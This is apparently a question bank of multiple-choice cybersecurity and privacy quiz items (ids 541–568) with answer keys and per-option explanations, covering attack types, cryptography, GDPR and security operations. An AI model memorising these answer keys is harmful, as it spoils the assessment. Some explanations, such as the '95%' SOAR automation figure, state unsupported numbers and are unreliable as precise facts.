  {id:541,domain:T,question:"What is a drive-by cryptomining attack?",options:["Mining cryptocurrency by physically transporting computing hardware to geographic locations that offer cheaper electricity rates, reducing operational costs through strategic facility placement","JavaScript code embedded in malicious or compromised websites that mines cryptocurrency using visitors' browser CPU resources without their knowledge","Installing persistent cryptocurrency mining software on a victim's device by exploiting browser vulnerabilities when the target visits a maliciously crafted website","An attack specifically targeting mobile devices that installs cryptomining applications through malicious app stores or drive-by downloads to drain battery and processing power"],answer:1,explanation:"Browser-based miners (Coinhive was infamous) run without installation — any browser visiting the page mines cryptocurrency, often going undetected except for high CPU usage.",optionExplanations:["Physical relocation for cheaper electricity is a legitimate mining cost optimization; drive-by cryptomining exploits website visitors' browsers without any installation or physical hardware setup.","Drive-by cryptomining embeds JavaScript mining code in web pages — visitors' browsers automatically execute it, consuming CPU to mine cryptocurrency for the attacker without downloading any files.","Installation-based mining requires exploiting a vulnerability to write malware to disk; drive-by cryptomining executes JavaScript directly in the browser without any software installation.","Mobile cryptomining attacks specifically target smartphones and tablets through app-based infection; drive-by cryptomining refers to browser-based delivery via websites, affecting any device with a browser."]},
  {id:542,domain:A,question:"What is software composition analysis (SCA)?",options:["Analyzing the organizational structure, skill sets, and staffing levels of software development teams to optimize resource allocation and project delivery timelines","Automated analysis of software projects to identify open source components, their versions, known vulnerabilities, and license obligations","Manually decomposing software architecture into individual subsystems and modules for security architects to review design patterns, data flows, and trust boundaries","A procurement analysis comparing the licensing costs and total cost of ownership of proprietary software components versus commercially available third-party alternatives"],answer:1,explanation:"SCA tools (Snyk, Black Duck, Dependabot) identify vulnerable open source libraries before attackers exploit them — Log4Shell affected millions of apps using Log4j.",optionExplanations:["Team composition analysis is workforce management; SCA analyzes the software codebase's open source dependency components, their versions, and associated security vulnerabilities.","SCA inventories all open source libraries in a codebase (the software bill of materials/SBOM), checks them against CVE databases, and flags vulnerable or unlicensed components.","Architecture decomposition for review is part of threat modeling; SCA specifically identifies third-party open source libraries in a codebase and checks them for known vulnerabilities.","Component pricing analysis is a procurement and financial activity; SCA is a security practice identifying vulnerable and improperly licensed open source components."]},
  {id:543,domain:O,question:"What is a penetration test report?",options:["A performance assessment report documenting network throughput, latency, packet loss, and bandwidth utilization measurements taken during scheduled load and stress testing activities","A detailed document from a penetration test engagement covering scope, methodology, discovered vulnerabilities, exploitation evidence, risk ratings, and remediation recommendations","A financial accounting document submitted by a contracted penetration tester to request reimbursement for travel, tools, and professional expenses incurred during the engagement","A formal certificate of completion issued to an organization confirming that penetration testing services were performed within a specified scope and timeframe"],answer:1,explanation:"Pentest reports provide technical findings for IT teams (reproduction steps, payloads) and executive summaries for leadership (risk ratings, business impact, prioritized recommendations).",optionExplanations:["Network speed test reports measure performance capacity; pentest reports document security vulnerabilities discovered through authorized attack simulation and their remediation paths.","A comprehensive pentest report documents scope, methodology, attack narratives, proof-of-concept evidence, vulnerability details, CVSS scores, and actionable remediation guidance.","Expense reports are financial documents for contractor billing; pentest reports are the primary technical deliverable documenting discovered vulnerabilities and recommended security improvements.","Completion certificates confirm the test took place; the pentest report is the substantive technical deliverable documenting what vulnerabilities were found and how to fix them."]},
  {id:544,domain:P,question:"What is data classification?",options:["Organizing and sorting data records by their creation timestamp, modification date, or access date to support retention schedules and lifecycle management policies","The process of categorizing data based on its sensitivity and business value to determine appropriate handling, storage, and protection requirements","Categorizing business transactions and financial records according to tax code requirements to support accurate reporting, deduction claims, and regulatory tax compliance","Designing relational database schemas by organizing data fields into normalized tables with appropriate primary keys, foreign key relationships, and indexing strategies"],answer:1,explanation:"Data classification (Public, Internal, Confidential, Restricted/Top Secret) drives security controls — unclassified data gets minimal protection; restricted data gets the strongest.",optionExplanations:["Date-based organization is records management and data lifecycle administration; data classification categorizes by sensitivity level to determine the required security controls and handling procedures.","Data classification assigns sensitivity labels that determine encryption requirements, access controls, handling procedures, retention periods, and disposal methods appropriate for each data category.","Tax classification is a financial reporting requirement; data classification is a security governance process that assigns sensitivity labels to determine appropriate data protection measures.","Database schema design is data architecture and database engineering; classification is a security governance process assigning sensitivity levels that determine encryption, access controls, and retention requirements."]},
  {id:545,domain:G,question:"What is block cipher mode of operation?",options:["The configuration setting that determines whether a web server processes symmetric encryption operations using hardware-accelerated SSL offload cards or software-based cipher implementations","Defines how a block cipher algorithm processes data larger than a single block — different modes have different properties for confidentiality, integrity, and performance","The processor privilege level or ring mode that the CPU operates in when executing cryptographic library functions, determining memory access and hardware instruction permissions","A hardware appliance configuration setting that determines which cipher suites, key lengths, and protocol versions the encryption device offers during TLS negotiation with clients"],answer:1,explanation:"ECB (never use — reveals patterns), CBC (sequential, needs IV), CTR (parallel, stream-like), GCM (provides both encryption and integrity) each have different security properties.",optionExplanations:["Server cipher configuration relates to SSL/TLS implementation choices; cipher modes define how block cipher algorithms handle data spanning multiple blocks.","Modes like CBC, GCM, and CTR solve the problem of encrypting data larger than one block (16 bytes for AES) — each mode trades off security properties, performance, and parallelizability differently.","CPU privilege rings are processor architecture concepts; cipher operating modes are cryptographic specifications defining how block ciphers chain multiple blocks together.","Appliance configuration modes are management and policy settings on hardware devices; cipher modes are cryptographic algorithm specifications governing how block encryption algorithms process multi-block messages."]},
  {id:546,domain:T,question:"What is an insider threat?",options:["Security threats originating from employees at competitor organizations, neighboring companies, or business partners who attempt unauthorized access to your systems from outside","Security threats originating from people within the organization — current/former employees, contractors, or business partners who misuse authorized access","A threat arising from any malicious actor who has gained network access, whether through VPN compromise, rogue wireless access, or perimeter firewall bypass","A phishing or pretexting attack where an external threat actor specifically targets internal employees through email, phone, or in-person deception to steal credentials or data"],answer:1,explanation:"Insider threats are particularly dangerous because they bypass perimeter controls — they have legitimate access and knowledge of sensitive systems and data locations.",optionExplanations:["Threats from competitor or adjacent organizations are external threats or third-party risks; insider threats specifically involve people who have authorized access to the organization's own systems.","Insider threats include malicious insiders (deliberate data theft, sabotage), negligent insiders (accidental exposure, falling for phishing), and compromised insiders (account takeover).","Network perimeter threats may involve external attackers who penetrated the perimeter; insider threats specifically involve authorized individuals with legitimate access acting against organizational interests.","Social engineering targeting employees is an external attack using insiders as a conduit through deception; true insider threats involve those with existing authorized access who knowingly act against the organization."]},
  {id:547,domain:A,question:"What is a content delivery network (CDN) and its security benefits?",options:["A private internal network that distributes corporate documents, software updates, and multimedia content to employees across different office locations through local file servers","A distributed network of servers that delivers content to users from geographically close locations, also providing DDoS mitigation and web application security","A dedicated network infrastructure specifically designed to transport encrypted media streams and DRM-protected content to authorized subscribers using secure delivery protocols","A web content management platform that allows authors to create, edit, organize, and publish website content through a browser-based administrative interface"],answer:1,explanation:"CDNs (Cloudflare, Akamai, Fastly) absorb DDoS attacks through distributed capacity, hide origin server IPs, and can enforce WAF and bot mitigation policies globally.",optionExplanations:["Internal corporate distribution networks serve employees within the organization; CDNs serve external public internet users from geographically distributed edge servers.","CDNs distribute content globally to improve performance but also provide security: hiding origin server IP addresses, absorbing DDoS traffic, applying WAF policies at edge, and filtering malicious bots.","Encrypted content delivery networks are a specialized use case; CDNs provide general-purpose content acceleration plus security features like DDoS mitigation and WAF capabilities.","Content management systems (CMS) handle content creation and publishing workflows; CDNs distribute already-published content globally to improve delivery speed and provide security protection."]},
  {id:548,domain:O,question:"What is a business continuity plan (BCP)?",options:["A strategic business expansion plan that outlines market entry strategies, growth targets, resource requirements, and timelines for entering new geographic markets or product lines","A comprehensive plan ensuring critical business functions can continue during and after a disruptive event, including procedures for people, processes, and technology","A strategic contingency plan outlining alternative business strategies and pivots that management can activate when the primary business model or market strategy fails","A fire safety and emergency evacuation procedure defining assembly points, evacuation routes, and personnel accountability processes for immediate life-safety events in office buildings"],answer:1,explanation:"BCPs address all aspects of business survival during disruptions — who does what, where teams work if offices are inaccessible, how customers are served, and how systems are restored.",optionExplanations:["Business expansion plans address strategic growth objectives; BCPs address operational resilience and continuity during disruptions that threaten existing business operations.","A BCP documents how essential business functions continue when normal operations are disrupted — alternative work locations, manual procedures, communication plans, and recovery priorities.","Failed strategy contingency plans are strategic management tools; BCPs address operational disruptions to business processes, facilities, and technology infrastructure during disasters.","Emergency evacuation procedures address immediate life-safety events and are one component of broader emergency management; BCPs focus on maintaining business operations during extended disruptions."]},
  {id:549,domain:T,question:"What is a Slowloris attack?",options:["An attack that deliberately routes traffic through slow dial-up or satellite connections to evade detection systems that flag unusually high-speed network traffic patterns","A low-bandwidth application-layer DDoS attack that holds server connections open by sending partial HTTP requests, exhausting available connection pools","A credential brute-force attack that introduces artificial delays between password attempts to avoid triggering account lockout thresholds and evade rate-limiting security controls","A network reconnaissance technique that uses very slow port scanning with long intervals between probes to evade intrusion detection systems that detect rapid scanning"],answer:1,explanation:"Slowloris keeps many HTTP connections open with partial headers, never completing them — the server holds connections indefinitely, exhausting its connection limit and denying service to legitimate users.",optionExplanations:["Slow connections as evasion are a general concept; Slowloris specifically exploits the behavior of HTTP servers that maintain open connections waiting for incomplete requests.","Slowloris sends partial HTTP headers at a slow rate — just enough to keep connections alive — gradually consuming all server connection slots without generating much traffic.","Slow credential brute-force attacks target authentication systems by throttling password attempt rates; Slowloris is specifically a web server connection exhaustion technique using partial HTTP requests.","Slow network scanning is a stealth reconnaissance technique; Slowloris is a web server availability attack that exhausts HTTP connection pools, not a reconnaissance activity."]},
  {id:550,domain:G,question:"What is a security token?",options:["A physical access control card or fob used for building entry, typically using RFID or NFC technology to grant access through secured doors","A physical or software device that generates time-based one-time passwords or stores cryptographic credentials for authentication","A digital certificate permanently embedded in a hardware device during manufacturing that uniquely identifies the device and enables secure communication or device attestation","A randomly generated session identifier stored in a browser cookie that authenticates a user to a web application during an active session"],answer:1,explanation:"Hardware tokens (RSA SecurID, YubiKey) and software tokens (TOTP apps like Google Authenticator) provide the 'something you have' factor in MFA — without physical possession, authentication fails.",optionExplanations:["Building access cards are physical security tokens for facility entry; cybersecurity security tokens are authentication devices that generate one-time passwords or store cryptographic credentials.","Security tokens generate OTPs (RSA SecurID), store private keys (YubiKey), or contain smart card certificates — providing a possession factor that attackers cannot steal remotely.","Hardware-embedded device certificates are used for device identity and attestation; security tokens are authentication devices providing the possession factor through OTP generation or credential storage.","Session identifiers (cookies, JWT tokens) are software authentication artifacts maintained during active web sessions; security tokens are physical or software MFA devices providing the possession factor."]},
  {id:551,domain:O,question:"What is DevSecOps?",options:["A software development team that employs dedicated security engineers who perform code reviews and security testing separately from the main development workflow","The practice of integrating security activities throughout the DevOps pipeline, making security everyone's responsibility from development through deployment","A security operations team that adopts DevOps collaboration tools like ticketing systems and chat platforms to improve communication with software development teams","A set of hardening techniques and controls specifically applied to CI/CD pipeline infrastructure, build servers, artifact repositories, and container orchestration environments"],answer:1,explanation:"DevSecOps shifts security left — developers run SAST scans locally, CI/CD pipelines include SCA and DAST, and infrastructure code is scanned for misconfigurations before deployment.",optionExplanations:["Dedicated security engineers embedded in dev teams is a good organizational practice, but DevSecOps integrates security tools and activities into the automated pipeline itself.","DevSecOps embeds security checks (SAST, DAST, SCA, secrets scanning, IaC scanning) into every phase of the software delivery pipeline, treating security as code.","Security teams adopting DevOps tooling is a communication improvement; DevSecOps is the cultural and technical integration of security practices into every stage of the software delivery pipeline.","Hardening DevOps infrastructure is one component; DevSecOps primarily means integrating security testing and gates into the software delivery process itself, making security part of every developer's workflow."]},
  {id:552,domain:T,question:"What is a macro virus?",options:["A computer virus characterized by an extremely large file size, often carrying substantial payloads that consume significant disk space and memory upon execution","Malicious code embedded in document macros (Word, Excel) that executes when the document is opened and macros are enabled","A hardware-affecting virus that damages camera firmware or imaging equipment controllers, corrupting configuration settings and preventing proper macro photography device operation","A self-propagating network virus that exploits unpatched vulnerabilities in network services to rapidly replicate across thousands of connected systems without user interaction"],answer:1,explanation:"Macro viruses were rampant in the 1990s (Melissa virus) and have resurged through malicious Office documents — often delivered via email to bypass perimeter controls.",optionExplanations:["File size does not define macro viruses; macro viruses are defined by their use of application macro scripting languages embedded in document files.","Macro viruses embed VBA or similar scripting code in Office documents — when the recipient opens the file and enables macros, the malicious code executes, often downloading additional malware.","Photography equipment firmware attacks are OT/embedded system threats; macro viruses specifically refer to malicious VBA or similar scripting code embedded in office productivity documents.","Rapidly self-propagating network viruses are worms; macro viruses spread through infected document sharing and require the user to open the document and enable macros."]},
  {id:553,domain:A,question:"What is a security testing tool DAST (Dynamic Application Security Testing)?",options:["A security testing approach where developers actively participate in live testing sessions, watching for unexpected behavior and immediately fixing identified issues during sessions","Testing a running application by simulating attacks from the outside to find vulnerabilities that manifest at runtime, complementing SAST code analysis","A static code analysis tool integrated into the IDE that scans source code for security flaws during development, flagging issues before compilation or deployment","A specialized security assessment focused exclusively on database systems, testing for SQL injection, privilege escalation, insecure stored procedures, and configuration weaknesses"],answer:1,explanation:"DAST tools (OWASP ZAP, Burp Suite) test the application as an attacker would — finding XSS, SQL injection, authentication flaws, and configuration issues that static analysis misses.",optionExplanations:["Developer-present testing is a collaborative practice; DAST tests running applications by simulating external attack inputs, not a developer participation model.","DAST actively probes the running application — sending malicious inputs, fuzzing endpoints, and analyzing responses — finding runtime vulnerabilities that can only be detected in a live environment.","Static analysis runs on source code without execution; DAST is dynamic because it tests the running application by sending attack inputs and analyzing responses.","Database security assessments are specialized; DAST is a general web application testing methodology that can test any running application, including database-backed web apps."]},
  {id:554,domain:P,question:"What is a Subject Access Request (SAR) under GDPR?",options:["A formal request by a data subject asking an organization to stop processing or publicly sharing their personal data for specific purposes or entirely","A formal request by an individual to an organization asking what personal data the organization holds about them and how it is used","An IT service desk request submitted by employees to obtain elevated access permissions to sensitive corporate systems, databases, or restricted file shares","A formal data portability request submitted by a data subject asking an organization to transfer their personal data to a competing service in machine-readable format"],answer:1,explanation:"Organizations must respond to SARs within one month, provide a copy of all held data, explain processing purposes and legal basis, and describe any third-party recipients.",optionExplanations:["Data suppression requests invoke the right to restrict processing (Article 18) or erasure (Article 17); a SAR invokes Article 15 transparency rights to know what data is held.","A SAR invokes the GDPR Article 15 right of access — the individual receives a copy of their personal data, information about processing purposes, retention periods, and data sharing.","System access requests are IT service management processes; SARs are legal privacy rights requests under GDPR Article 15 enabling individuals to obtain copies of their personal data.","Data portability requests invoke GDPR Article 20 rights to receive and transfer personal data to another provider; SARs invoke Article 15 rights to access and review held data."]},
  {id:555,domain:G,question:"What is the purpose of IV (Initialization Vector) in encryption?",options:["The process of powering on and configuring dedicated hardware security modules or encryption accelerator cards to prepare them for cryptographic operation in the environment","A random or pseudo-random value used alongside the encryption key to ensure that encrypting the same plaintext with the same key produces different ciphertexts","The primary cryptographic parameter in a symmetric encryption scheme that determines the overall security strength and resistance to brute-force attacks on the ciphertext","A secure channel or protocol mechanism specifically designed to transmit symmetric encryption keys from one party to another during an initial key exchange or provisioning step"],answer:1,explanation:"IVs prevent patterns in encrypted output — without an IV, the same message encrypted twice produces identical ciphertext, leaking information about repeated content.",optionExplanations:["Hardware encryption initialization is a device setup process; IVs are cryptographic values injected into the encryption algorithm to ensure ciphertext uniqueness across multiple encryptions of the same data.","An IV ensures that encrypting identical plaintexts produces different ciphertexts each time — preventing traffic analysis attacks that exploit patterns in encrypted streams.","Key length determines cipher strength and resistance to brute force; IVs ensure uniqueness across encryption operations but do not affect the fundamental security level of the cipher.","Key transmission uses key exchange protocols like Diffie-Hellman or asymmetric encryption; IVs accompany ciphertext and can be transmitted in plaintext since they are not secret."]},
  {id:556,domain:O,question:"What is a security advisory?",options:["Verbal or written guidance from an independent security consultant on improving security practices, prioritizing investments, and addressing identified architectural weaknesses in a system","A formal notification about a security vulnerability or issue, typically published by vendors or security researchers, describing the vulnerability and available mitigations","A procurement recommendation document from IT or security staff suggesting the purchase of specific security software tools to address identified protection gaps","Security best-practice guidance published by government agencies like CISA or NIST providing general recommendations on securing specific technologies or industry sectors"],answer:1,explanation:"Security advisories (CVE descriptions, vendor bulletins like Microsoft Patch Tuesday) enable organizations to assess risk and prioritize patching before exploitation occurs.",optionExplanations:["Consultant advice is informal professional guidance; security advisories are formal, publicly published vulnerability notifications with CVE identifiers, affected versions, and remediation guidance.","Security advisories document discovered vulnerabilities — their scope, affected versions, CVE ID, CVSS score, and recommended mitigations — providing actionable information for security teams.","Software purchase recommendations are procurement documents; security advisories are technical vulnerability disclosures published to notify users of specific flaws and available patches.","Government security guidance provides general best-practice recommendations; security advisories are specific notifications about particular vulnerabilities in identified products, published by vendors or researchers."]},
  {id:557,domain:T,question:"What is a social engineering pretext?",options:["Introductory text appearing before the main phishing content in an email, designed to increase credibility by referencing prior legitimate communications or shared context","A fabricated scenario or false context that an attacker creates to establish trust and legitimacy when approaching a target","The initial OSINT gathering phase where attackers research target organizations and individuals using social media, LinkedIn, and public records to identify useful information","The technical preparation phase involving creating fake websites, spoofed email domains, and caller ID spoofing infrastructure before launching a social engineering campaign"],answer:1,explanation:"A convincing pretext (impersonating IT support, an auditor, a vendor, or HR) makes targets comply with requests they'd normally question — believability is the key success factor.",optionExplanations:["Email preamble is formatting and structure; a pretext is the entire false identity and fabricated scenario an attacker constructs to manipulate a target into compliance.","A pretext is the story an attacker tells — 'I'm from IT and need to verify your credentials due to a security incident' — creating a plausible reason for the unusual request.","Reconnaissance precedes pretexting by gathering information used to make the pretext believable; the pretext itself is the false scenario and identity used during the actual attack.","Technical infrastructure (fake sites, spoofed addresses) supports the attack but is separate from the pretext; the pretext is the narrative and false identity used to manipulate the target."]},
  {id:558,domain:A,question:"What is an air gap?",options:["A structural gap or void intentionally created in server room walls to accommodate cable routing, cooling airflow, and other infrastructure in secure facilities","Complete physical isolation of a network or system from untrusted networks, including the internet, achieved by having no physical or logical network connections","A vulnerability in HVAC systems or building automation networks that allows attackers to manipulate temperature controls and potentially damage sensitive IT equipment","The required physical distance that security guard personnel must maintain between each other during patrol routes to ensure adequate physical security coverage"],answer:1,explanation:"Air-gapped systems (classified networks, SCADA systems, nuclear controls) were thought impenetrable until Stuxnet demonstrated that USB drives could bridge the gap.",optionExplanations:["Physical structural gaps are construction and facilities engineering concerns; air gaps are network isolation strategies ensuring no electronic network connections exist.","An air-gapped system has absolutely no network connections to external networks — data can only move in/out through physical media (USB, CD), creating a security boundary that network-based attacks cannot cross.","HVAC security vulnerabilities are building management system concerns; air gaps are network isolation techniques with no wireless or wired connections to external networks.","Security personnel spacing is physical security operations management; air gaps are complete network isolation strategies ensuring a system has no electronic connections to external networks."]},
  {id:559,domain:P,question:"What is the purpose of a consent record under GDPR?",options:["Documenting user authentication events, session durations, and access patterns in system logs for security monitoring, audit trails, and troubleshooting access issues","Documented proof that valid consent was obtained from individuals before processing their personal data, including what was consented to, when, and how","A request log documenting every data subject access request received, including the requester's identity, the date received, and the organization's response timeline","A delivery log confirming that privacy notices and policy updates were sent to customers, including the date sent and the content of each notice version"],answer:1,explanation:"GDPR requires organizations to prove they obtained valid, specific, informed consent — consent records must capture the exact consent given, when, through what mechanism, and for what purpose.",optionExplanations:["Authentication logs record system access events for security monitoring; consent records document the legal basis for data processing by recording what individuals agreed to and when.","Consent records provide evidence for regulators that processing has a valid legal basis — they capture the consent text presented, date, mechanism (checkbox, signature), and scope of what was consented.","SAR records track rights requests for compliance tracking; consent records specifically document the collection, scope, and withdrawal of individual consent for specific data processing activities.","Privacy notice delivery records confirm communication occurred; consent records document the active, specific agreement individuals gave to particular processing activities, not just that they received a notice."]},
  {id:560,domain:G,question:"What is authenticated encryption?",options:["An encryption system that requires the user to authenticate with a password or biometric before the decryption key is released or the encrypted volume is mounted","An encryption scheme that simultaneously provides confidentiality, integrity, and authenticity — ensuring data is encrypted and that tampering can be detected","An encryption approach that uses X.509 digital certificates to authenticate communication parties before establishing an encrypted session and exchanging symmetric session keys","A security workflow that first verifies user identity through multi-factor authentication and then applies encryption to protect the data the authenticated user accesses"],answer:1,explanation:"AES-GCM (used in TLS 1.3) provides authenticated encryption — the ciphertext includes an authentication tag that detects any modification, preventing padding oracle and bit-flipping attacks.",optionExplanations:["Requiring authentication before decryption is access control over encrypted data; authenticated encryption is a cryptographic property combining confidentiality with integrity and authenticity in a single operation.","Authenticated encryption modes (AES-GCM, ChaCha20-Poly1305) provide encryption for confidentiality plus a MAC for integrity in a single operation — defeating attacks that exploit the lack of integrity checking.","Certificate-based encryption uses PKI to authenticate parties; authenticated encryption is a specific cryptographic mode like AES-GCM that combines encryption with an authentication tag in one operation.","Sequential authentication then encryption is an access control workflow; authenticated encryption is a single cryptographic operation that simultaneously provides both confidentiality and integrity protection."]},
  {id:561,domain:T,question:"What is a network-based IDS vs. a host-based IDS (HIDS)?",options:["Network IDS is implemented as software sensors on servers, while host-based IDS is implemented as dedicated hardware appliances installed at physical network access points","Network IDS monitors traffic on network segments; host IDS monitors activity on individual systems including file changes, process activity, and log events","HIDS monitors physical aspects of host security like server room access and hardware tampering, while NIDS monitors logical network security events like policy violations","Network IDS provides more accurate detection because it has full network visibility, while host IDS generates significantly more false positives due to normal system activity noise"],answer:1,explanation:"NIDS sees network patterns (port scans, protocol anomalies); HIDS sees what's actually happening on the host (files changed, new processes, log tampering) — together they provide comprehensive visibility.",optionExplanations:["Both NIDS and HIDS can be software or hardware implementations; the fundamental distinction is what they monitor, not the physical form of the implementation.","NIDS (Snort, Suricata) captures and analyzes network packets; HIDS (OSSEC, Wazuh) monitors endpoint activity — each provides visibility the other cannot.","Both monitor logical/software security events; NIDS captures and analyzes network packets while HIDS monitors operating system activity like file changes and process execution.","Detection accuracy depends on configuration and tuning, not deployment type; both NIDS and HIDS generate false positives, and neither is inherently more accurate."]},
  {id:562,domain:A,question:"What is a security orchestration playbook?",options:["A comprehensive security team training manual that documents security procedures, tool usage guides, and incident response protocols for onboarding new security operations center analysts","A documented, automated workflow that defines the step-by-step actions a SOAR platform should take in response to a specific type of security alert or incident","A strategic playbook for competing red and blue security teams in a purple team exercise, documenting attack techniques, expected detections, and validation test scenarios","A structured discussion script used to facilitate tabletop exercises where security team members walk through hypothetical incident scenarios to identify response gaps"],answer:1,explanation:"SOAR playbooks automate 95% of alert responses — looking up IP reputation, quarantining endpoints, creating tickets, and notifying analysts — reducing MTTR from hours to seconds.",optionExplanations:["Training manuals are educational documents for personnel; security orchestration playbooks are machine-executable automated workflows that drive SOAR platform responses to specific alert types.","A SOAR playbook defines triggers (alert type, severity), enrichment steps (IP lookup, user lookup), decision logic (is this malicious?), response actions (block, quarantine, notify), and documentation steps.","Security team exercise playbooks guide tabletop and purple team exercises; security orchestration playbooks are automated technical response workflows executed by SOAR platforms.","Tabletop exercise scripts guide team discussions about hypothetical scenarios; SOAR playbooks are automated technical response workflows that trigger and execute actions based on live alerts."]},
  {id:563,domain:O,question:"What is patch management and why is it critical?",options:["Physically managing patch cables, cable trays, and cable labeling in network closets and data centers to maintain organized and documented cabling infrastructure","The systematic process of identifying, acquiring, testing, and deploying security patches to remediate known vulnerabilities before they can be exploited","Fixing software defects by modifying source code during the development phase, testing the fix in development environments, and merging it into the codebase","Applying firmware updates exclusively to specialized industrial control equipment and OT devices while excluding standard IT systems from the update management process"],answer:1,explanation:"Unpatched vulnerabilities are the most common attack vector — EternalBlue (WannaCry), Log4Shell, and ProxyLogon all exploited known vulnerabilities with available patches.",optionExplanations:["Copper patch cable management is physical infrastructure organization; patch management addresses software and firmware security updates to remediate known vulnerabilities across IT systems.","Patch management includes vulnerability scanning to find unpatched systems, risk prioritization by CVSS score and exploitability, testing in non-production, and deploying patches within defined SLAs.","Code-level bug fixes during development are the development team's normal workflow; patch management applies vendor-released security patches to production systems across the operational IT environment.","Firmware management for OT devices only is a limited scope; comprehensive patch management covers all system types including servers, workstations, network devices, and specialized equipment."]},
  {id:564,domain:T,question:"What is a smurfing attack?",options:["A social engineering attack campaign that uses cartoon characters and animated graphics in phishing emails to appeal to younger or less technical targets and bypass content filters","A DDoS amplification attack that spoofs the victim's IP as the source of ICMP echo requests sent to broadcast addresses, causing many hosts to flood the victim with replies","A coordinated influence operation using multiple fictional online personas and accounts to spread disinformation, manipulate public opinion, and artificially amplify social media narratives","A targeted attack campaign orchestrated by a small cell of highly skilled threat actors who coordinate their individual actions to maximize impact on a specific organization"],answer:1,explanation:"Smurf attacks amplify traffic by spoofing the victim's IP in ping broadcasts — each ping to a /24 network generates 254 responses back to the victim.",optionExplanations:["The name 'Smurf' is colloquial and unrelated to cartoons; smurfing is a network-layer DDoS amplification attack exploiting ICMP broadcasts, not a social engineering technique.","A Smurf attack sends ICMP ping requests with the victim's spoofed source IP to network broadcast addresses — every device on the broadcast domain responds, sending amplified traffic to the victim.","Fictional persona attacks are information operations or social media manipulation; smurfing is a specific network-layer DDoS amplification technique exploiting IP spoofing and broadcast address behavior.","Attacker group size does not define smurfing; it is a specific technical attack exploiting IP broadcast amplification, achievable by a single attacker with minimal bandwidth resources."]},
  {id:565,domain:G,question:"What is a message authentication code (MAC)?",options:["The hardware MAC address of a network interface card used in 802.1X network access control to authenticate and authorize devices before granting network access","A fixed-size value computed from a message and a secret key that allows verification of both data integrity and the sender's knowledge of the secret key","A proprietary verification code appended to email messages by enterprise email security gateways to allow receiving systems to confirm the email originated from a trusted gateway","A digital signature computed using the CA's private key and appended to an X.509 certificate so that relying parties can verify the certificate's authenticity and integrity"],answer:1,explanation:"MACs (HMAC, CMAC, Poly1305) detect tampering and verify the sender has the shared secret — unlike signatures, they're symmetric, requiring both parties to share the key.",optionExplanations:["Hardware MAC addresses are Layer 2 network identifiers used for device identification; message authentication codes are cryptographic constructs that verify message integrity using a shared secret key.","A MAC is computed using a secret key shared between sender and receiver — any modification of the message produces a different MAC, enabling tampering detection.","Email authentication codes are specific implementations; a message authentication code is a general cryptographic primitive computed from both message content and a shared secret key.","Certificate signatures use asymmetric key pairs where the CA signs with its private key and anyone verifies with the public key; MACs use a single shared symmetric secret key."]},
  {id:566,domain:P,question:"What is the purpose of a data protection impact assessment (DPIA)?",options:["A business impact analysis specifically focused on how natural disasters affecting data center facilities could disrupt data availability, processing capabilities, and service delivery","A systematic process for evaluating how a processing activity impacts individuals' privacy rights and identifying measures to minimize those impacts","A post-incident analysis that quantifies the business and regulatory impact of a data breach, including affected record counts, notification obligations, and reputational damage","A technical evaluation of new storage infrastructure such as cloud object storage or NAS systems, assessing capacity, performance, redundancy, and integration requirements"],answer:1,explanation:"GDPR Article 35 requires DPIAs for high-risk processing (biometrics, large-scale surveillance, systematic profiling) before implementation, not after.",optionExplanations:["Natural disaster impact on data centers is business continuity planning; DPIAs evaluate privacy risks to individuals from planned data processing activities before those activities begin.","A DPIA systematically identifies privacy risks in a planned processing activity, assesses necessity and proportionality, and documents measures to minimize risk — required before starting high-risk processing.","Post-breach impact assessment is part of incident response; DPIAs are prospective risk assessments conducted before new processing begins, not reactive analyses after breaches occur.","Data storage system technical evaluations are infrastructure assessments; DPIAs assess the full privacy impact of processing activities on individuals' rights, covering the entire processing operation."]},
  {id:567,domain:A,question:"What is an active directory (AD) and why is it a primary attack target?",options:["An actively maintained organizational directory listing security team contacts, escalation paths, and on-call schedules for incident response and security event notifications","A Microsoft directory service managing authentication and authorization for Windows environments — a primary attack target because compromising it means controlling all domain-joined systems","A simple database table that stores records of currently active user accounts, session states, and last login timestamps for application authentication purposes","A network monitoring platform that maintains an active directory of discovered network devices, their configurations, performance metrics, and current operational status in real time"],answer:1,explanation:"Controlling Active Directory means owning the entire Windows domain — attackers pursue domain dominance, targeting Domain Admins and using tools like BloodHound to map attack paths.",optionExplanations:["Security contact directories are organizational communication resources; Active Directory is Windows identity infrastructure managing authentication, authorization, and group policy for an entire enterprise domain.","Active Directory is the identity backbone of most Windows enterprises — it stores user accounts, computer accounts, group policies, and trust relationships. Domain Admin access provides control over all domain resources.","AD does manage users but is far more than a user database; it manages authentication, authorization, group policies, computer accounts, and trust relationships across an entire Windows enterprise.","Network device monitoring platforms use SNMP and NetFlow; Active Directory manages Windows identity, authentication, and group policy enforcement across domain-joined systems."]},
  {id:568,domain:O,question:"What is a security exception process?",options:["The practice of dismissing or suppressing security alerts that analysts determine to be false positives, removing them from queues without triggering further investigation","A formal process for granting temporary or permanent exceptions to security policies when business requirements prevent full compliance, with documented justification, compensating controls, and approval","A formal escalation procedure for reporting high-severity security incidents as exceptions to standard SLA timelines, triggering executive notification and expedited response resources","A documented waiver from mandatory security awareness training requirements, granted to specific employees whose role or circumstances prevent timely training completion"],answer:1,explanation:"Exception processes prevent security debt from accumulating invisibly — requiring approval (CISO, risk committee) and compensating controls ensures risk is accepted consciously, not ignored.",optionExplanations:["Alert suppression is a security operations efficiency practice; security exceptions formally document and accept specific policy deviations with compensating controls and management approval.","Security exceptions document why a specific requirement cannot be met (legacy system, vendor limitation), what compensating controls offset the risk, who approved the exception, and when it expires.","Incident escalation procedures manage response prioritization; security exceptions proactively document known policy gaps before incidents occur, with formal risk acceptance and compensating controls.","Training requirement waivers may be one specific type of exception; security exception processes cover all policy requirements where compliance is infeasible, not just training."]},
